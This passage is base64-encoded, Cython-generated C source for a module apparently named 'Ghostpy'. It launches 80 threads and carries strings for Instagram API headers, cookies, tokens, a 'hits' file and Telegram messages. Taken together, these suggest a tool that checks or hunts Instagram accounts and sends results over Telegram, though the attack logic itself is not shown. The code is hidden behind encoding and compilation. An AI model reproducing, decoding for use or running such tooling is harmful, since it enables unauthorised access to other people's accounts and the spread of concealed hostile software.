TDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90YXJnZXQsIF9fcHl4X3RfOSwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMSwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGFlbW9uLCBQeV9UcnVlLCBfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncysxLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTApOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MjcsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIF9fcHl4X3RfMiA9IF9fcHl4X3RfNzsKICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzYgPSAwOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIE5VTEx9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0YXJ0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDI3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgZm9yIChfX3B5eF90XzExID0gMDsgX19weXhfdF8xMSA8IDgwOyBfX3B5eF90XzExKz0xKSB7CiAgICBfX3B5eF90XzMgPSBQeUxvbmdfRnJvbVNzaXplX3QoX19weXhfdF8xMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQzMCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfXzI1LCBfX3B5eF90XzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDMwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgIAogICAgX19weXhfdF81ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RocmVhZCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdHB5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNDMxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgX19weXhfdF82ID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF82ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMSA6IDApXSA9IHtfX3B5eF90XzUsIE5VTEx9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGFyZ2V0LCBfX3B5eF90XzksIF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrMSwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX3B5eF90XzIgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpLCBfX3B5eF90XzQpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDMxLCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgICB9CiAgICBfX3B5eF90XzcgPSBfX3B5eF90XzI7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfNiA9IDA7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9OwogICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RhcnQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0MzEsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIH0KCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Rlc3QsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCgogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7CiAgaWYgKF9fcHl4X20pIHsKICAgIGlmIChfX3B5eF9tc3RhdGUtPl9fcHl4X2QgJiYgc3RyaW5ndGFiX2luaXRpYWxpemVkKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiaW5pdCBhdyIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgfQogICAgI2lmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURQogICAgUHlfQ0xFQVIoX19weXhfbSk7CiAgICAjZWxzZQogICAgUHlfREVDUkVGKF9fcHl4X20pOwogICAgaWYgKHB5c3RhdGVfYWRkbW9kdWxlX3J1bikgewogICAgICBQeU9iamVjdCAqdHAsICp2YWx1ZSwgKnRiOwogICAgICBQeUVycl9GZXRjaCgmdHAsICZ2YWx1ZSwgJnRiKTsKICAgICAgUHlTdGF0ZV9SZW1vdmVNb2R1bGUoJl9fcHl4X21vZHVsZWRlZik7CiAgICAgIFB5RXJyX1Jlc3RvcmUodHAsIHZhbHVlLCB0Yik7CiAgICB9CiAgICAjZW5kaWYKICB9IGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7CiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfSW1wb3J0RXJyb3IsICJpbml0IGF3Iik7CiAgfQogIF9fcHl4X0wwOjsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUCiAgcmV0dXJuIChfX3B5eF9tICE9IE5VTEwpID8gMCA6IC0xOwogICNlbHNlCiAgcmV0dXJuIF9fcHl4X207CiAgI2VuZGlmCn0KCgp0eXBlZGVmIHN0cnVjdCB7CiAgICBjb25zdCBjaGFyICpzOwojaWYgNzkyIDw9IDY1NTM1CiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBuOwojZWxpZiA3OTIgLyAyIDwgSU5UX01BWAogICAgY29uc3QgdW5zaWduZWQgaW50IG47CiNlbGlmIDc5MiAvIDIgPCBMT05HX01BWAogICAgY29uc3QgdW5zaWduZWQgbG9uZyBuOwojZWxzZQogICAgY29uc3QgUHlfc3NpemVfdCBuOwojZW5kaWYKI2lmIDEgPD0gMzEKICAgIGNvbnN0IHVuc2lnbmVkIGludCBlbmNvZGluZyA6IDU7CiNlbGlmIDEgPD0gMjU1CiAgICBjb25zdCB1bnNpZ25lZCBjaGFyIGVuY29kaW5nOwojZWxpZiAxIDw9IDY1NTM1CiAgICBjb25zdCB1bnNpZ25lZCBzaG9ydCBlbmNvZGluZzsKI2Vsc2UKICAgIGNvbnN0IFB5X3NzaXplX3QgZW5jb2Rpbmc7CiNlbmRpZgogICAgY29uc3QgdW5zaWduZWQgaW50IGlzX3VuaWNvZGUgOiAxOwogICAgY29uc3QgdW5zaWduZWQgaW50IGludGVybiA6IDE7Cn0gX19QeXhfU3RyaW5nVGFiRW50cnk7CnN0YXRpYyBjb25zdCBjaGFyICogY29uc3QgX19weXhfc3RyaW5nX3RhYl9lbmNvZGluZ3NbXSA9IHsgMCB9OwpzdGF0aWMgY29uc3QgX19QeXhfU3RyaW5nVGFiRW50cnkgX19weXhfc3RyaW5nX3RhYltdID0gewogIHtfX3B5eF9rXywgc2l6ZW9mKF9fcHl4X2tfKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzAsIHNpemVvZihfX3B5eF9rXzApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCwgc2l6ZW9mKF9fcHl4X2tfMF8wX251bGxfbnVsbF93ZWJfZ2xpZl9zaWdudXBfMCksIDAsIDEsIDB9LCAKICB7X19weXhfa18wZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MCwgc2l6ZW9mKF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiwgc2l6ZW9mKF9fcHl4X2tfMGQwNjdjMmY4NmNhYzJjMTdkNjU1NjMxYzljZWMyNDBfMiksIDAsIDEsIDB9LCAKICB7X19weXhfa18xLCBzaXplb2YoX19weXhfa18xKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzE3MDAyNTE1NzRfOTgyLCBzaXplb2YoX19weXhfa18xNzAwMjUxNTc0Xzk4MiksIDAsIDEsIDB9LCAKICB7X19weXhfa18xXzAwMCwgc2l6ZW9mKF9fcHl4X2tfMV8wMDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMV8zOW0sIHNpemVvZihfX3B5eF9rXzFfMzltKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzFrYnBzLCBzaXplb2YoX19weXhfa18xa2JwcyksIDAsIDEsIDB9LCAKICB7X19weXhfa18yMDI0X29yXzIwMjUsIHNpemVvZihfX3B5eF9rXzIwMjRfb3JfMjAyNSksIDAsIDEsIDB9LCAKICB7X19weXhfa18yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2LCBzaXplb2YoX19weXhfa18yMl8yQzBfMkMwXzJDMV8yQ251bGxfMkMwXzJDNTE2KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzIyXzJDXzIyLCBzaXplb2YoX19weXhfa18yMl8yQ18yMiksIDAsIDEsIDB9LCAKICB7X19weXhfa18yNTYxODI2MTg0MTE1MDg0MCwgc2l6ZW9mKF9fcHl4X2tfMjU2MTgyNjE4NDExNTA4NDApLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzBtXzQ3bSwgc2l6ZW9mKF9fcHl4X2tfMzBtXzQ3bSksIDAsIDEsIDB9LCAKICB7X19weXhfa18zNTYsIHNpemVvZihfX3B5eF9rXzM1NiksIDAsIDEsIDB9LCAKICB7X19weXhfa18zOF81XzE1bSwgc2l6ZW9mKF9fcHl4X2tfMzhfNV8xNW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDJtLCBzaXplb2YoX19weXhfa18zOF81XzIwMm0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDNtLCBzaXplb2YoX19weXhfa18zOF81XzIwM20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDRtLCBzaXplb2YoX19weXhfa18zOF81XzIwNG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDVtLCBzaXplb2YoX19weXhfa18zOF81XzIwNW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDZtLCBzaXplb2YoX19weXhfa18zOF81XzIwNm0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMDdtLCBzaXplb2YoX19weXhfa18zOF81XzIwN20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMjZtLCBzaXplb2YoX19weXhfa18zOF81XzIyNm0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMjdtLCBzaXplb2YoX19weXhfa18zOF81XzIyN20pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMjhtLCBzaXplb2YoX19weXhfa18zOF81XzIyOG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMjltLCBzaXplb2YoX19weXhfa18zOF81XzIyOW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMzBtLCBzaXplb2YoX19weXhfa18zOF81XzIzMG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yMzFtLCBzaXplb2YoX19weXhfa18zOF81XzIzMW0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8yNDhtLCBzaXplb2YoX19weXhfa18zOF81XzI0OG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfMzhfNV8zOW0sIHNpemVvZihfX3B5eF9rXzM4XzVfMzltKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rXzM4XzVfNDZtLCBzaXplb2YoX19weXhfa18zOF81XzQ2bSksIDAsIDEsIDB9LCAKICB7X19weXhfa18zOF81XzQ4bSwgc2l6ZW9mKF9fcHl4X2tfMzhfNV80OG0pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfM2JyVHZ3LCBzaXplb2YoX19weXhfa18zYnJUdncpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfNCwgc2l6ZW9mKF9fcHl4X2tfNCksIDAsIDEsIDB9LCAKICB7X19weXhfa181MGNjNjg2MV83MDM2XzQzYjRfODAyZV9mYjQyODI3OSwgc2l6ZW9mKF9fcHl4X2tfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfNTY3MDY3MzQzMzUyNDI3LCBzaXplb2YoX19weXhfa181NjcwNjczNDMzNTI0MjcpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmosIHNpemVvZihfX3B5eF9rXzl5M041a0xxemlhbFFBN3o5NkFNaXlBS0xNQldwcVZqKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0FjY2VwdF9FbmNvZGluZywgc2l6ZW9mKF9fcHl4X2tfQWNjZXB0X0VuY29kaW5nKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0FjY2VwdF9MYW5ndWFnZSwgc2l6ZW9mKF9fcHl4X2tfQWNjZXB0X0xhbmd1YWdlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0MsIHNpemVvZihfX3B5eF9rX0MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQ1lBTiwgc2l6ZW9mKF9fcHl4X2tfQ1lBTiksIDAsIDEsIDF9LCAKICB7X19weXhfa19DaGFubmVsLCBzaXplb2YoX19weXhfa19DaGFubmVsKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0Nvbm5lY3Rpb24sIHNpemVvZihfX3B5eF9rX0Nvbm5lY3Rpb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfQ29udGVudF9MZW5ndGgsIHNpemVvZihfX3B5eF9rX0NvbnRlbnRfTGVuZ3RoKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0NvbnRlbnRfVHlwZSwgc2l6ZW9mKF9fcHl4X2tfQ29udGVudF9UeXBlKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0Nvb2tpZSwgc2l6ZW9mKF9fcHl4X2tfQ29va2llKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0Rldiwgc2l6ZW9mKF9fcHl4X2tfRGV2KSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0ZvcmUsIHNpemVvZihfX3B5eF9rX0ZvcmUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR0hPU1QsIHNpemVvZihfX3B5eF9rX0dIT1NUKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dIT1NUX1JGWCwgc2l6ZW9mKF9fcHl4X2tfR0hPU1RfUkZYKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0dIT1NUX1JGWF8yLCBzaXplb2YoX19weXhfa19HSE9TVF9SRlhfMiksIDAsIDEsIDB9LCAKICB7X19weXhfa19HTiwgc2l6ZW9mKF9fcHl4X2tfR04pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfR1JFRU4sIHNpemVvZihfX3B5eF9rX0dSRUVOKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0LCBzaXplb2YoX19weXhfa19HaG9zdCksIDAsIDEsIDF9LCAKICB7X19weXhfa19HaG9zdF9lcnJvcl9pbl9mdW5jdGlvbiwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RfZXJyb3JfaW5fZnVuY3Rpb24pLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfR2hvc3RfbG9jYWxzX2dlbmV4cHIsIHNpemVvZihfX3B5eF9rX0dob3N0X2xvY2Fsc19nZW5leHByKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0Y29uZiwgc2l6ZW9mKF9fcHl4X2tfR2hvc3Rjb25mKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0dob3N0aGl0c190eHQsIHNpemVvZihfX3B5eF9rX0dob3N0aGl0c190eHQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfR2hvc3RweSwgc2l6ZW9mKF9fcHl4X2tfR2hvc3RweSksIDAsIDEsIDF9LCAKICB7X19weXhfa19IVE1MLCBzaXplb2YoX19weXhfa19IVE1MKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0hvc3QsIHNpemVvZihfX3B5eF9rX0hvc3QpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfSG9zdF9HQVBTLCBzaXplb2YoX19weXhfa19Ib3N0X0dBUFMpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfSUQsIHNpemVvZihfX3B5eF9rX0lEKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX0luZm9BY2MsIHNpemVvZihfX3B5eF9rX0luZm9BY2MpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfSW5zdGFncmFtXzEwMF8wXzBfMTdfMTI5X0FuZHJvaWQsIHNpemVvZihfX3B5eF9rX0luc3RhZ3JhbV8xMDBfMF8wXzE3XzEyOV9BbmRyb2lkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX0xpZ2VyLCBzaXplb2YoX19weXhfa19MaWdlciksIDAsIDEsIDF9LCAKICB7X19weXhfa19Nb3ppbGxhXzVfMF9XaW5kb3dzX05UXzEwXzBfV2luNiwgc2l6ZW9mKF9fcHl4X2tfTW96aWxsYV81XzBfV2luZG93c19OVF8xMF8wX1dpbjYpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfTm9uZSwgc2l6ZW9mKF9fcHl4X2tfTm9uZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19QUk9GSUxFLCBzaXplb2YoX19weXhfa19QUk9GSUxFKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1JFRCwgc2l6ZW9mKF9fcHl4X2tfUkVEKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1JFU0VUX0FMTCwgc2l6ZW9mKF9fcHl4X2tfUkVTRVRfQUxMKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1Nlc3Npb24sIHNpemVvZihfX3B5eF9rX1Nlc3Npb24pLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfU2V4LCBzaXplb2YoX19weXhfa19TZXgpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfU2V4eSwgc2l6ZW9mKF9fcHl4X2tfU2V4eSksIDAsIDEsIDF9LCAKICB7X19weXhfa19TdHlsZSwgc2l6ZW9mKF9fcHl4X2tfU3R5bGUpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfVEwsIHNpemVvZihfX3B5eF9rX1RMKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1RPS0VOLCBzaXplb2YoX19weXhfa19UT0tFTiksIDAsIDEsIDF9LCAKICB7X19weXhfa19UZWxlZ3JhbV9tZXNzYWdlX2NvdWxkX25vdF9iZV9zZSwgc2l6ZW9mKF9fcHl4X2tfVGVsZWdyYW1fbWVzc2FnZV9jb3VsZF9ub3RfYmVfc2UpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfVGhyZWFkLCBzaXplb2YoX19weXhfa19UaHJlYWQpLCAwLCAxLCAxfSwgCiAge19fcHl4X2tfVGltZXIsIHNpemVvZihfX3B5eF9rX1RpbWVyKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1Rva2VuX2J1bHVuYW1hZCwgc2l6ZW9mKF9fcHl4X2tfVG9rZW5fYnVsdW5hbWFkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1VzZXJfQWdlbnQsIHNpemVvZihfX3B5eF9rX1VzZXJfQWdlbnQpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfVywgc2l6ZW9mKF9fcHl4X2tfVyksIDAsIDEsIDF9LCAKICB7X19weXhfa19XSUZJLCBzaXplb2YoX19weXhfa19XSUZJKSwgMCwgMSwgMX0sIAogIHtfX3B5eF9rX1hfQmxva3NfVmVyc2lvbl9JZCwgc2l6ZW9mKF9fcHl4X2tfWF9CbG9rc19WZXJzaW9uX0lkKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1hfRkJfSFRUUF9FbmdpbmUsIHNpemVvZihfX3B5eF9rX1hfRkJfSFRUUF9FbmdpbmUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfWF9GQl9MU0QsIHNpemVvZihfX3B5eF9rX1hfRkJfTFNEKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1hfSUdfQXBwX0lELCBzaXplb2YoX19weXhfa19YX0lHX0FwcF9JRCksIDAsIDEsIDB9LCAKICB7X19weXhfa19YX0lHX0JhbmR3aWR0aF9TcGVlZF9LQlBTLCBzaXplb2YoX19weXhfa19YX0lHX0JhbmR3aWR0aF9TcGVlZF9LQlBTKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1hfSUdfQmFuZHdpZHRoX1RvdGFsQnl0ZXNfQiwgc2l6ZW9mKF9fcHl4X2tfWF9JR19CYW5kd2lkdGhfVG90YWxCeXRlc19CKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1hfSUdfQmFuZHdpZHRoX1RvdGFsVGltZV9NUywgc2l6ZW9mKF9fcHl4X2tfWF9JR19CYW5kd2lkdGhfVG90YWxUaW1lX01TKSwgMCwgMSwgMH0sIAogIHtfX3B5eF9rX1hfSUdfQ2FwYWJpbGl0aWVzLCBzaXplb2YoX19weXhfa19YX0lHX0NhcGFiaWxpdGllcyksIDAsIDEsIDB9LCAKICB7X19weXhfa19YX0lHX0Nvbm5lY3Rpb25fU3BlZWQsIHNpemVvZihfX3B5eF9rX1hfSUdfQ29ubmVjdGlvbl9TcGVlZCksIDAsIDEsIDB9LCAKICB7X19weXhfa19YX0lHX0Nvbm5lY3Rpb25fVHlwZSwgc2l6ZW9mKF9fcHl4X2tfWF9JR19Db25uZWN0aW9uX1R5cGUpLCAwLCAxLCAwfSwgCiAge19fcHl4X2tfWF9QaWdlb25fUmF3Y2xpZW50dGltZSwgc2l6ZW9mKF9fcHl4X2tfWF9QaWdlb25fUmF3Y2xpZW50dGltZSksIDAsIDEsIDB9LCAKICB7X19weXhfa19YX1BpZ2Vvbl9TZXNzaW9uX0lkLCBzaXplb2YoX19weXhfa1